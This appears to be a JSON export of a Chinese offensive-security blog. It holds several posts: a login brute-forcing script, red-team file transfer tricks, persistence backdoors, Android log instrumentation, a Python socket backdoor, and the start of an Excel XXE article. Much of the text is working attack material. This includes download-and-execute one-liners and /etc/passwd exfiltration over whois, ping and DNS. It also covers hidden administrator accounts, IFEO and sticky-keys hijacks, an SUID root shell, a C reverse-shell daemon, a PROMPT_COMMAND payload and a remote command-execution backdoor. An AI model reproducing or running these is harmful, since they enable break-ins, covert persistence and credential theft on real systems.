permissions per drive.accesschk.exe -uwqs Users c:*.accesschk.exe -uwqs “Authenticated Users” c:\\.* ` Final Thoughts 本指南旨在成为Windows权限升级的“基础”。如果你想真正掌握这门课程，你需要投入大量的工作和研究。与测试的所有方面一样，枚举是关键，你对目标的了解越多，你拥有的攻击途径越多，成功率就越高。 另请注意，您有时可能会将您的权限提升为管理员。从管理员升级到SYSTEM的权限不是问题，您始终可以重新配置服务或创建具有SYSTEM级别权限的计划任务。 现在出去弹出SYSTEM !!","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"python遍历路径破解表单","slug":"python遍历路径破解表单","date":"2019-03-12T02:35:27.000Z","updated":"2019-03-12T02:53:37.017Z","comments":true,"path":"2019/03/python遍历路径破解表单/","link":"","permalink":"/2019/03/python遍历路径破解表单/","excerpt":"","text":"python遍历路径破解表单​ 首先是利用python遍历路径，采用字典爆破的形式，当然如果只是单纯的爆破路径，简单写一个多线程脚本就行了。这里考虑如何对爆破到的路径进行第二步利用，此处尝试对猜解到的路径进行表单发现及登陆爆破处理。 ​ 首先就是路径爆破，采用多线程队列，爆破路径，判断形式为200响应码。 while not self._queue.empty(): queue = self._queue.get(timeout=0.5) try: r = requests.get(self.url+queue,timeout=5, headers=self.headers) if r.status_code == 200: print &quot;[200] %s&quot; %(queue) soup = BeautifulSoup(r.content,&#39;html.parser&#39;) if soup.find(&#39;form&#39;): self.brute(soup, queue) 猜解到路径后交给brute方法处理，方法实现了一个css选择器，获取form表单中的input字段标签，提取标签参数组合成post参数值，然后提取表单中的action跳转页面，如没有页面默认在当前表单页提交。 input = soup.select(&quot;form input&quot;) for i in input: try: if i.attrs[&#39;type&#39;] == &quot;hidden&quot;: name, value = i.attrs[&#39;name&#39;], i.attrs[&#39;value&#39;] list_post.append(name+&#39;=&#39;+value) elif i.attrs[&#39;type&#39;] == &#39;password&#39;: name = i.attrs[&#39;name&#39;] list_post.append(name+&#39;=$$$&#39;) else: name = i.attrs[&#39;name&#39;] list_post.append(name+&#39;=%%%&#39;) except: continue for i in list_post: post = post + i + &#39;&amp;&#39; action = soup.find_all(&#39;form&#39;) for i in action: if i[&#39;action&#39;]: actiontag = i[&#39;action&#39;] else: actiontag = queue self.payload(post, actiontag) 获取参数值后，交给payload方法处理登陆，采用requests库的session登陆。获取cookie，先采用session请求获取cookie后，再采用session携带cookie进行请求提交。然后对输入的验证值进行判断是否为登陆成功。 for name in self.username(): post_user = post.replace(&#39;%%%&#39;,name.strip()) for pwd in self.password(): post_pwd = post_user.replace(&#39;$$$&#39;,pwd.strip()) session = requests.Session() session.get(self.url+&#39;/&#39;+action, headers=self.headers, verify=False) r = session.post(self.url+&#39;/&#39;+action, data=post_pwd, headers=self.headers, verify=False) if self.word in r.content: print &#39;[username] %s&#39; %name +&#39;\\r&#39; + &#39;[password] %s&#39; %pwd return 为了判断是否登陆成功，采用的人为输入判断字符串的形式。也就是脚本执行形式为 python xxx.py http://xxxx.com xxxxx","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"红队后渗透测试中的文件传输技巧","slug":"红队后渗透测试中的文件传输技巧","date":"2019-03-08T01:25:06.000Z","updated":"2019-03-08T01:40:57.034Z","comments":true,"path":"2019/03/红队后渗透测试中的文件传输技巧/","link":"","permalink":"/2019/03/红队后渗透测试中的文件传输技巧/","excerpt":"","text":"原文链接：https://xax007.github.io/2019-01-13-post-exploitation-file-transfer-tips/ 在红队渗透测试当中往往需要最大化利用当前的环境绕过重兵防守的系统的防火墙、IDS、IPS等报警和监控系统进行文件传输，本文列出了多种利用操作系统默认自带的工具进行文件传输的方法。 搭建 HTTP serverPythonpython2: python -m SimpleHTTPServer 1337 以上命令会在当前目录启动 HTTP 服务，端口为 1337 python3: python -m http.server 1337 以上命令会在当前目录启动 HTTP 服务，端口为 1337 PHP 5.4+当 PHP 版本大于 5.4 是，可使用 PHP 在当前目录启动 HTTP 服务，端口为 1337 php -S 0.0.0.0:1337 Ruby下面的命令会在当前目录下启动 HTTP 服务，端口为 1337 ruby -rwebrick -e&#39;WEBrick::HTTPServer.new(:Port =&gt; 1337, :DocumentRoot =&gt; Dir.pwd).start&#39; Ruby 1.9.2+ruby -run -e httpd . -p 1337 Perlperl -MHTTP::Server::Brick -e &#39;$s=HTTP::Server::Brick-&gt;new(port=&gt;1337); $s-&gt;mount(&quot;/&quot;=&gt;{path=&gt;&quot;.&quot;}); $s-&gt;start&#39; perl -MIO::All -e &#39;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub { $_[0] &lt; io(-x $1 +? &quot;./$1 |&quot; : $1) if /^GET \\/(.*) / })&#39; Thanks to: http://stackoverflow.com/questions/8058793/single-line-python-webserver busybox httpdbusybox httpd -f -p 8000 本条来自:lvm 从 HTTP server 下载文件以下列出了在 Windows 和 Linux 系统下使用系统自带工具从 HTTP Server 下载文件的几种方法 Windowspowershell下载并执行: powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://1.2.3.4/5.exe&#39;,&#39;c:\\download\\a.exe&#39;);start-process &#39;c:\\download\\a.exe&#39; certutil下载并执行: certutil -urlcache -split -f http://1.2.3.4/5.exe c:\\download\\a.exe&amp;&amp;c:\\download\\a.exe bitsadmin下载并执行: bitsadmin /transfer n http://1.2.3.4/5.exe c:\\download\\a.exe &amp;&amp; c:\\download\\a.exe ⚠️ bitsadmin 的下载速度比较慢 regsvr32regsvr32 /u /s /i:http://1.2.3.4/5.exe scrobj.dll LinuxCurlcurl http://1.2.3.4/backdoor Wgetwget http://1.2.3.4/backdoor awk在使用 awk 进行下载文件时，首先使用以上列出的任意一条命令启动一个 HTTP Server awk &#39;BEGIN { RS = ORS = &quot;\\r\\n&quot; HTTPCon = &quot;/inet/tcp/0/127.0.0.1/1337&quot; print &quot;GET /secret.txt HTTP/1.1\\r\\nConnection: close\\r\\n&quot; |&amp; HTTPCon while (HTTPCon |&amp; getline &gt; 0) print $0 close(HTTPCon) }&#39; 效果： Setup HTTP PUT server以下列出了上传文件到 HTTP Server 的几种方法 使用 Nginx 搭建 HTTP PUT Servermkdir -p /var/www/upload/ # 创建目录 chown www-data:www-data /var/www/upload/ # 修改目录所属用户和组 cd /etc/nginx/sites-available # 进入 nginx 虚拟主机目录 # 写入配置到 file_upload 文件 cat &lt;&lt;EOF &gt; file_upload server { listen 8001 default_server; server_name kali; location / { root /var/www/upload; dav_methods PUT; } } EOF # 写入完毕 cd ../sites-enable # 进入 nginx 虚拟主机启动目录 ln -s /etc/nginx/sites-available/file_upload file_upload # 启用 file_upload 虚拟主机 systemctl start nginx # 启动 Nginx 使用 Python 搭建 HTTP PUT Server以下代码保存到 HTTPutServer.py 文件里: # ref: https://www.snip2code.com/Snippet/905666/Python-HTTP-PUT-test-server import sys import signal from threading import Thread from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler class PUTHandler(BaseHTTPRequestHandler): def do_PUT(self): length = int(self.headers[&#39;Content-Length&#39;]) content = self.rfile.read(length) self.send_response(200) with open(self.path[1:], &quot;w&quot;) as f: f.write(content) def run_on(port): print(&quot;Starting a HTTP PUT Server on {0} port {1} (http://{0}:{1}) ...&quot;.format(sys.argv[1], port)) server_address = (sys.argv[1], port) httpd = HTTPServer(server_address, PUTHandler) httpd.serve_forever() if __name__ == &quot;__main__&quot;: if len(sys.argv) &lt; 3: print(&quot;Usage:\\n\\tpython {0} ip 1337&quot;.format(sys.argv[0])) sys.exit(1) ports = [int(arg) for arg in sys.argv[2:]] try: for port_number in ports: server = Thread(target=run_on, args=[port_number]) server.daemon = True # Do not make us wait for you to exit server.start() signal.pause() # Wait for interrupt signal, e.g. KeyboardInterrupt except KeyboardInterrupt: print &quot;\\nPython HTTP PUT Server Stoped.&quot; sys.exit(1) 运行方法: $ python HTTPutServer.py 10.10.10.100 1337 Starting a HTTP PUT Server on 10.10.10.100 port 1337 (http://10.10.10.100:1337) ... 上传文件到 HTTP PUT serverLinuxCurl$ curl --upload-file secret.txt http://ip:port/ Wget$ wget --method=PUT --post-file=secret.txt http://ip:port/ WindowsPowershell$body = Get-Content secret.txt Invoke-RestMethod -Uri http://ip:port/secret.txt -Method PUT -Body $body 使用 Bash /dev/tcp 进行文件传输首先需要监听端口 接收端: nc -lvnp 1337 &gt; secret.txt 发送端: cat secret.txt &gt; /dev/tcp/ip/port 使用 SMB 协议进行文件传输搭建简易 SMB Server搭建简易SMB Server 需要用到 Impacket 项目的 smbserver.py 文件 Impacket 已默认安装在 Kali Linux 系统中 syntax: impacker-smbserver ShareName SharePath $ mkdir smb # 创建 smb 目录 $ cd smb # 进入 smb目录 $ impacket-smbserver share `pwd` # 在当前目录启动 SMB server，共享名称为 share 效果： 从 SMB server 下载文件copy \\\\IP\\ShareName\\file.exe file.exe 上传文件到 SMB servernet use x: \\\\IP\\ShareName copy file.txt x: net use x: /delete 使用 whois 命令进行文件传输graph LR A[Host A] – /etc/passwd –&gt; B[Host B] 接收端 Host B： nc -vlnp 1337 | sed &quot;s/ //g&quot; | base64 -d 发送端 Host A： whois -h 127.0.0.1 -p 1337 `cat /etc/passwd | base64` 效果： 使用 ping 命令进行文件传输graph LR A[Sender] – secret.txt –&gt; B[Reciver] 发送端: xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done 接收端: 以下代码保存到 ping_receiver.py import sys try: from scapy.all import * except: print(&quot;Scapy not found, please install scapy: pip install scapy&quot;) sys.exit(0) def process_packet(pkt): if pkt.haslayer(ICMP): if pkt[ICMP].type == 8: data = pkt[ICMP].load[-4:] print(f&#39;{data.decode(&quot;utf-8&quot;)}&#39;, flush=True, end=&quot;&quot;, sep=&quot;&quot;) sniff(iface=&quot;eth0&quot;, prn=process_packet) 执行方法: python3 ping_receiver.py 效果 使用 dig 命令进行文件传输graph LR A[Sender] – /etc/passwd –&gt; B[Reciver] 发送端: xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done 接收端: 以下代码使用了 python 的 scapy 模块，需要手动安装 代码保存到 dns_reciver.py 文件中 try: from scapy.all import * except: print(&quot;Scapy not found, please install scapy: pip install scapy&quot;) def process_packet(pkt): if pkt.haslayer(DNS): domain = pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;) root_domain = domain.split(&#39;.&#39;)[1] if root_domain.startswith(&#39;gooogle&#39;): print(f&#39;{bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)}&#39;, flush=True, end=&#39;&#39;) sniff(iface=&quot;eth0&quot;, prn=process_packet) 运行方法: python3 dns_reciver.py 效果： 使用 NetCat 进行文件传输graph LR Sender[A:10.10.10.100] – 1.txt –&gt; Reciver[B:10.10.10.200] 接受端: nc -l -p 1337 &gt; 1.txt 发送端： cat 1.txt | nc -l -p 1337 或者 nc 10.10.10.200 1337 &lt; 1.txt 在极端环境下，如果接受端没有 nc 可以使用 Bash 的 /dev/tcp 接收文件: cat &lt; /dev/tcp/10.10.10.200/1337 &gt; 1.txt","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"渗透之权限维持","slug":"渗透之权限维持","date":"2019-03-08T01:24:46.000Z","updated":"2019-03-08T01:40:48.490Z","comments":true,"path":"2019/03/渗透之权限维持/","link":"","permalink":"/2019/03/渗透之权限维持/","excerpt":"","text":"原文链接：渗透之权限维持杂谈 0x01 MSFpersistence msf内置的后渗透权限维持工具persistence Metsvc它是通过在已经获得shell的目标主机上开启了一个服务来提供后门的功能。run Metsvc -h Scheduleme &amp; Schtasksabusemsf中自动利用计划任务的后门程序，后面会聊到linux和windows平台的计划任务。 run scheduleme -h # 例子：上传nc并创建计划任务每一分钟执行一次 &#39;nc -e cmd.exe -L -p 8080&#39; run scheduleme -m 1 -e /tmp/nc.exe -o &quot;-e cmd.exe -L -p 8080&quot; run Schtasksabuse -h # 例子：每隔4秒执行一次calc.exe run schtasksabuse -t 192.168.2.7 -c &quot;cmd /c calc.exe&quot; -d 4 Mof_ps_persist 现在已经找不到这个利用模块，参考：https://github.com/khr0x40sh/metasploit-modules/blob/master/persistence/mof_ps_persist.rb Autorunscript获取shell的时候自动执行持续化脚本,可以被Autorunscript执行的命令目录在metasploit/scripts/meterpreter # persistence use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.2.101 set LPORT 5555 set ExitOnSession false set AutoRunScript persistence -r 192.168.2.101 -p 5556 -U -X -i 30 exploit # metsvc use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.2.101 set LPORT 5555 set ExitOnSession false set AutoRunScript metsvc -A exploit 0x02 计划任务无论是windows还是linux操作系统都提供计划任务功能，来实现定时或者周期性的执行一些指令。自然而然我们可以在计划任务中做手脚，埋后门。 windows 图形化工具：taskschd.msc 命令行工具：schtasks.exe SCHTASKS /parameter [arguments] 描述: 允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任 务。 参数列表: /Create 创建新计划任务。 /Delete 删除计划任务。 /Query 显示所有计划任务。 /Change 更改计划任务属性。 /Run 按需运行计划任务。 /End 中止当前正在运行的计划任务。 /ShowSid 显示与计划的任务名称相应的安全标识符。 /? 显示此帮助消息。 Examples: SCHTASKS SCHTASKS /? SCHTASKS /Run /? SCHTASKS /End /? SCHTASKS /Create /? SCHTASKS /Delete /? SCHTASKS /Query /? SCHTASKS /Change /? SCHTASKS /ShowSid /? Payload examples: SCHTASKS /Create /TN update /TR xx(待执行的命令) /DELAY ONLOGON /F /RL HIGHEST linux 一次性执行任务：at命令———&gt;atd进程 周期性执行任务：crontab命令———&gt;crond进程 在实际的渗透过程中我们更倾向于使用crontab at - 1.服务开启 service atd start - 2.基本格式 at [HH:MM] [yyyy-mm-dd] #没有指定年月日的，默认是当天的。 - 3.查询当前设置的at任务列表 atq #或at -l - 4.删除指定任务编号的at任务 atrm 编号 #或at -d - 5.查看计划任务的具体内容 at -c 任务号 - 6.使用文件中的命令作为计划任务（比较少用） at 时间 -f 文件 - 7.相关文件 /etc/at.deny：#该名单里面的人不可以使用 /etc/at.allow：#只有该名单里面的人可以使用 crontab 注意：（1）crontab 只会在/sbin、/bin、/usr/sbin、/usr/bin下查找命令，如果命令不在这些目录中，应该要使用绝对路径。（2）只有root用户可以管理其他用户的周期性任务（3）crontab在重启后之前的周期性任务无效，anacron可以弥补crontab的缺陷。配置文件：/etc/anacrontab。anacrontab会开机自动检查没有执行的计划任务，然乎逐一执行，这个过程是用户透明的。一般而言，crontab就已经可以满足基本的需求。 - 1.服务开启 service crond start - 2.编辑计划任务 crontab -e -u 用户名 - 3.查看计划任务 crontab -l -u 用户名 - 4.删除计划任务： crontab -r -u 用户名 - 相关文件 /var/spool/cron/用户名 #用户定义的设置 /var/log/cron #cron服务的日志文件 /etc/crontab #cron服务配置文件： anacron anacron是一个不同于crontab的任务，其只精确到天，用来弥补服务器在宕机下crond调度不周以及缓解计划任务执行过于集中的问题。它需要记录上次执行的时间，并更新到相应的/var/spool/anacron目录下，下次执行的时候会将当前时间和上次记录的时间进行对比，如果满足大于/etc/anacron的配置的天数就会立即执行相应的命令，然后刷新时间。 anacron 命令行参数： -t 配置文件路径 让anacron从指定配置文件中读取配置，常用于普通用户来管理个人任务 -S spooldir 设定新的spool目录来记录任务执行的时间戳，常用于普通用户来管理个人任务 -T 测试配置文件是否正确 -f 强制执行所有的任务，而不管之前的执行日期是否超过轮回天数 -u 将所有任务的执行日期都更新为当前日期，而不真正的执行任务 -s 串行地执行任务，只有前一个任务完成后才开始下一个任务 0x03 windows权限维持影子账户创建一个无法用用户本机用户罗列工具显示的用户，并且赋予管理员权限。所有操作需要有管理员权限。同时测试在windows server 2012服务器域环境下影子账户无法直接进行添加。 用’$’创建匿名用户，并归到administratorsa用户组 net user admin$ Test1 /add net localgroup administrators admin$ /add 导出匿名用户对应的sam目录下的注册表键值 regedt32.exe 打开 HKEY_LOCAL_MACHINESAMSAMDomainsAccountUsers键值，导出Names下用户目录以及对应的16进制目录。注意需要给Administrator用户赋予Sam键值权限，默认是不允许的。 删除匿名用户，双击导出的注册表文件，用先前导出的注册表键值对注册表进行修改。则可以重新还原之前的匿名用户，但是除了在注册表里面有用户记录，其他地方都不存在用户的信息。net user或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。 net user admin$ /del PowerShell后门Empire框架 https://github.com/EmpireProject/Empire Schtasks-Backdoor https://github.com/re4lity/Schtasks-Backdoor msf use exploit/multi/script/web_delivery - 设置好参数后的powershell例子： powershell.exe -ExecutionPolicy Bypass -nop -w hidden -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $V.downloadstring(&#39;http://192.168.80.155:8888/&#39;); 注册表开机启动在如下的注册表目录下注入键值HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun，可以实现开机自启动。以windows defender为例: 映像劫持 细节参考：https://www.anquanke.com/post/id/151425 涉及到的注册表项为IFEO（Image File Execution Options），默认是只有管理员和local system有权读写修改。 “HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Options” 大致的原理如下：当我们按照常理运行属于IFEO列表的文件的时候（即可执行文件名在上述的注册表项下，出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就可以正常运行。）会执行相关的选项参数，这里我们主要利用的参数是debugger,通过该参数我们可以实现偷梁换柱。下面以修改IE启动程序为例，实现运行IE程序但是启动的却是计算器。 1. 找到注册表“HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Options”目录下的iexplore.exe 2. 添加一个debugger字符串键值，并且赋值为calc.exe的执行路径，“C:Windowssystem32calc.exe” 3. 运行 iexplore.exe,bomb!!! 当然我们也可以在第一步新键一个注册表文件目录，取名为想要覆盖的可执行程序，后续步骤类似。 但是这样明目张胆的偷梁换柱有点张扬，根据安全客那篇文章，修改另外两个注册表键值可以实现原程序退出后静默运行后门程序。以执行notepad为例，退出后静默运行calc.exe reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionsnotepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512 reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitnotepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1 reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitnotepad.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;C:Windowssystem32calc.exe&quot; shift后门这个后门的方式比较老，在windows登陆的时候按五次shift打开cmd进行操作。前提条件是:在将C盘windows目录下面的system32文件夹可写的情况下，将里面的sethc.exe应用程序进行转移，并生成sethc.exe.bak文件。并将cmd.exe拷贝覆盖sethc.exe。 但是在windows xp过后，sethc组件属于完全受信用的用户TrustInstall，我们无法修改名字，这时候即使administrators都只有名义上的只读和可执行权，我们可以手动修改其所属为administrators，步骤如下： 右键属性/安全/高级； 所有者/编辑/添加当前用户/应用/确定； 关闭窗口； 右键属性/安全/编辑； 选择Administrators（或者你的当前组）/勾选完全控制/确定； 0x04 linux权限维持可以看到windows的权限维持很多时候是基于注册表值，但是linux里面没有注册表项，但是有很多的配置文件选项，可以达到相似的功能。下面介绍一些比较实用的后门手段。 sshd软连接 原理细节： http://www.91ri.org/16803.html victim ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555; attack ssh root@x.x.x.x -p 5555 SUID Shellroot 权限下执行如下命令，普通用户运行/dev/.rootshell即可获得root权限 cp /bin/bash /dev/.rootshell chmod u+s /dev/.rootshell alias瞒天过海我们可以通过alias来指定执行特定的命令时候静默运行其他程序，从而达到启动后门，记录键值等作用。下面举两个实例： 修改ssh命令，利用strace，使其具有记录ssh对read,write,connect调用的功能。 alias ssh=&#39;strace -o /tmp/sshpwd-`date &#39;+%d%h%m%s&#39;`.log -e read,write,connect -s2048 ssh&#39; 利用守护进程回弹shell alias cat=&#39;cat&amp;&amp;/root/.shell&#39; shell.c #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;time.h&gt; #include &lt;fcntl.h&gt; #include &lt;string.h&gt; #include &lt;sys/stat.h&gt; #include &lt;signal.h&gt; #define ERR_EXIT(m) do { perror(m); exit(EXIT_FAILURE); } while (0); void creat_daemon(void); int main(void) { time_t t; int fd; creat_daemon(); system(&quot;bash -i &gt;&amp; /dev/tcp/192.168.80.167/8080 0&gt;&amp;1&quot;); return 0; } void creat_daemon(void) { pid_t pid; int devnullfd,fd,fdtablesize; umask(0); pid = fork(); if( pid == -1) ERR_EXIT(&quot;fork error&quot;); if(pid &gt; 0 ) exit(EXIT_SUCCESS); if(setsid() == -1) ERR_EXIT(&quot;SETSID ERROR&quot;); chdir(&quot;/&quot;); /* close any open file descriptors */ for(fd = 0, fdtablesize = getdtablesize(); fd &lt; fdtablesize; fd++) close(fd); devnullfd = open(&quot;/dev/null&quot;, 0); /* make STDIN ,STDOUT and STDERR point to /dev/null */ if (devnullfd == -1) { ERR_EXIT(&quot;can&#39;t open /dev/null&quot;); } if (dup2(devnullfd, STDIN_FILENO) == -1) { ERR_EXIT(&quot;can&#39;t dup2 /dev/null to STDIN_FILENO&quot;); } if (dup2(devnullfd, STDOUT_FILENO) == -1) { ERR_EXIT(&quot;can&#39;t dup2 /dev/null to STDOUT_FILENO&quot;); } if (dup2(devnullfd, STDERR_FILENO) == -1) { ERR_EXIT(&quot;can&#39;t dup2 /dev/null to STDOUT_FILENO&quot;); } signal(SIGCHLD,SIG_IGN); return; } linux PAM密码记录后门pam是一种认证机制，它可帮助管理员快速方便地配置认证方式，并且无需更改服务程序。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。 https://blog.51cto.com/redkey/1343316 PROMPT_COMMAND后门bash提供了一个环境变量PROMPT_COMMAND,这个变量会在你执行命令前执行一遍。 export PROMPT_COMMAND=&quot;lsof -i:1025 &amp;&gt;/dev/null || (python -c &quot;exec(&#39;encoded_payload&#39;.decode(&#39;base64&#39;))&quot; 2&gt;/dev/null &amp;)&quot; 当然也可以使用prompt_command进行提权,参考：https://www.anquanke.com/post/id/155943 ssh免密后门把id_rsa.pub写入服务端的/home/[用户名]/.ssh/authorized_keys中。 rootkitrootit的后门相对比较顽固，有应用级别和系统级别的rootkit，其大致的思路是hook进常规的调用中，是比较硬核的，经常体现在APT攻击中。下面是一个菊苣收集的rootkit后门的链接。具体的细节因为不同的rootkit具体实现不一致，笔者才疏，无法完全弄清楚，仅给出链接，方便日后学习。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"Android 代码插桩","slug":"Android-代码插桩","date":"2019-02-14T09:51:20.000Z","updated":"2019-02-14T09:54:37.699Z","comments":true,"path":"2019/02/Android-代码插桩/","link":"","permalink":"/2019/02/Android-代码插桩/","excerpt":"","text":"何为代码插桩​ 最早是由J.C. Huang 教授提出的，它是在保证被测程序原有逻辑完整性的基础上在程序中插入一些探针（又称为“探测仪”，本质上就是进行信息采集的代码段，可以是赋值语或采集覆盖信息的函数调用，通过探针的执行并抛出程序运行的特征数据，通过对这些数据的分析，可以获得程序的控制流和数据流信息，进而得到逻辑覆盖等动态信息，从而实现测试目的的方法。 ​ 何为安卓插桩测试，插桩测试提供了一种通过 am instrument 命令启动的特殊测试执行环境，其中目标应用进程会重启并使用基本的应用上下文进行初始化，并在应用进程虚拟机内启动插桩线程。您的测试代码在此插桩线程上开始执行，并附带一个 Instrumentation 实例，该实例可提供对应用上下文和 API 的访问权限，以操纵接受测试的应用进程。 详细内容可以查看谷歌的插桩测试框架和方式：插桩测试 Log插桩此处，仅利用打印Log的方式来表示如何进行插桩。代码使用之前调试的代码，尝试来打印输入的字符串。 反编译后如下代码： 分析代码可以看到，如果需要打印输出，则实际获取到字符串的代码为 Name.getText().toString().trim() 因此，需要在onClick函数中打印输出，函数需要在按钮事件中触发，按钮相关的事件代码在MainActivity$1中。 在MainActivity$1中查看onClick函数。 假设，需要打印输入的name变量。则需要在如下添加： iget-object v1, p0, Lcom/example/user/application/MainActivity$1;-&gt;this$0:Lcom/example/user/application/MainActivity; iget-object v1, v1, Lcom/example/user/application/MainActivity;-&gt;Name:Landroid/widget/EditText; invoke-virtual {v1}, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable; move-result-object v1 invoke-virtual {v1}, Ljava/lang/Object;-&gt;toString()Ljava/lang/String; move-result-object v1 此内容为上图中关于带入name的smali代码，意思是，从MainActivity获取实例对象。赋值给v1寄存器，然后再调用getText()函数和toString()函数。 在添加 const-string v0, &quot;message&quot; invoke-static {v0, v1}, Landroid/util/Log;-&gt;i(Ljava/lang/String;Ljava/lang/String;)I 意思是调用Log.i函数打印输入，如上添加内容换算成Java代码类似于 Log.i(&quot;message&quot;,Name.getText().toString()); 回编译安装运行，监听日志输出，点击按钮事件可以看到如下的日志输出。 此种形式可以用在获取函数变量值和某些动态生成的参数中，来理解程序运行的结果和函数运行的方式。","categories":[],"tags":[{"name":"移动安全","slug":"移动安全","permalink":"/tags/移动安全/"}]},{"title":"利用python socket编写后门","slug":"利用python-socket编写后门","date":"2019-02-02T03:00:50.000Z","updated":"2019-02-01T03:51:10.255Z","comments":true,"path":"2019/02/利用python-socket编写后门/","link":"","permalink":"/2019/02/利用python-socket编写后门/","excerpt":"","text":"在获取系统权限时候，一般想维持权限或者做端口转发的时候，会用一些端口转发的工具，例如nc，ew，lcx等。 但在这种类似后门的工具中被查杀率和存在后门的情况时有发生，本人就遇到过获取系统权限创建账号后，发现没多久又被植入其他隐藏账号的情况。 因此，既然会写一些代码就简单的来实现一个利用socket通信的后门脚本。 如下server端： # coding:utf-8 import socket import subprocess # server def server_main(ips): server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: server.bind((&quot;0.0.0.0&quot;, ips)) server.listen(5) print &quot;[*] Listening on %s:%d&quot; %(socket.gethostname(),ips) while True: data, addr = server.accept() buf = data.recv(4096) print &quot;[*] recv command = %s&quot; %buf if len(buf) != 0: if is_file(buf): rev = upload(buf) else: rev = run_command(buf) data.send(rev) except: print &quot;Exception!&quot; def is_file(buf): try: if isinstance(eval(buf), dict): return True except: return False def run_command(command): command = command.strip() try: p = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) out, err = p.communicate() except: out = &quot;Fail to execute command!&quot; return out def upload(data): try: path = eval(data)[&#39;path&#39;] file = eval(data)[&#39;request&#39;] with open(path, &#39;wb&#39;) as f: f.write(file) return &quot;OK&quot; except: return &quot;Fail&quot; if __name__ == &quot;__main__&quot;: ip = input(&quot;PORT = &quot;) server_main(int(ip)) client端： #coding:utf-8 import socket # client # use: # &gt;&gt; command eg:&gt;&gt; whoami # &gt;&gt; upload 要上传的源文件 要上传到的目标地址文件 &gt;&gt; upload d:/a.txt e:/a.txt def client(ips, data): resp = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: resp.settimeout(10) resp.connect(ips) resp.send(data) out = resp.recv(4096) resp.close() except : out = &quot;Except Or Time out !&quot; return out def client_send(target, port): while True: data = raw_input(&quot;&gt;&gt; &quot;) if &#39;upload&#39; not in data: out = client((target,port),data) print &quot;[*] Command Out= %s&quot; % out else: upload((target,port),data) def upload(ips,data): file = data.split(&#39; &#39;) list_a = {} name = file[1].replace(&#39;\\\\&#39;,&#39;/&#39;) list_a[&#39;path&#39;] = file[2] request = &#39;&#39; with open(name,&#39;rb&#39;) as f: for i in f.readlines(): request+=i list_a[&#39;request&#39;] = request out = client(ips, str(list_a)) if &quot;OK&quot; in out: print &quot;[*] File Write Success !&quot; else: print &quot;[*] File Write Fail !&quot; if __name__ == &quot;__main__&quot;: ip = raw_input(&quot;IP:PORT = &quot;) list_a = ip.split(&quot;:&quot;) client_send(list_a[0], int(list_a[1])) 代码实现简单，问题在执行的时候是一个正向连接，在服务器开放端口，所以在一定情况下，需要较高的权限。当然这也是后渗透中需要得到的目标。 同时可以利用pyinstaller打包为exe文件在win下运行，不过开放防火墙就需要添加网络允许，但本人尝试中发现，对防火墙端口添加的提示中直接关闭窗口提示，再次运行就可以正常使用。防火墙中也没有启用此运行规则。尚不清楚原因。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"利用EXCEL文件进行XXE文件攻击","slug":"利用EXCEL文件进行XXE文件攻击","date":"2019-01-31T03:38:27.000Z","updated":"2019-01-31T03:40:41.082Z","comments":true,"path":"2019/01/利用EXCEL文件进行XXE文件攻击/","link":"","permalink":"/2019/01/利用EXCEL文件进行XXE文件攻击/","excerpt":"","text":"利用EXCEL文件进行XXE文件攻击此问题的来源是：https://mp.weixin.qq.com/s/pthuQFY9sQjxJOOQf91Weg 看到一篇如上的文章，利用EXCEL文档来造成系统的XXE漏洞，而恰好在我们自己的系统上发现了如上的类似漏洞，特此做一个记录文档。 0x01.什么是XML外部实体解释来源：https://www.freebuf.com/articles/web/126788.html 如果你了解XML，你可以把XML理解为一个用来定义数据的东东。因此，两个采用不同技术的系统可以通过XML进行通信和交换数据。 比如，下图就是一个用来描述一个职工的XML文档样本，其中的’name’,’salary’,’address’ 被称为XML的元素。 有些XML文档包含system标识符定义的“实体”，这些XML文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了XML ‘实体’。 在上面的代码中， 